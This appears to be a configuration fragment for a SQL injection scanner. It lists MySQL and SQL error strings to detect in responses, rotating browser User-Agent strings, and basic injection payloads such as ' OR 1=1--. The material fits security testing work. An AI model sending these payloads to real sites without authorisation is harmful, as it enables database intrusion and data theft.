# SQL Injection error messages to look for in responses (you can change the errors wrt the database you are dealing with)
SQLI_ERRORS = [
    "you have an error in your sql syntax;",
    "mysql_fetch_array()",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_num_rows()",
    "supplied argument is not a valid MySQL result resource"
]

# List of User-Agent strings to use for requests (you can add more)
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
]

# List of SQL Injection payloads to test (i have added the basic payloads best of luck :D)
PAYLOADS = [
    "'", '"', "';", "' OR 1=1--", "' AND 1=2--", "') OR '1'='1", "')--"
]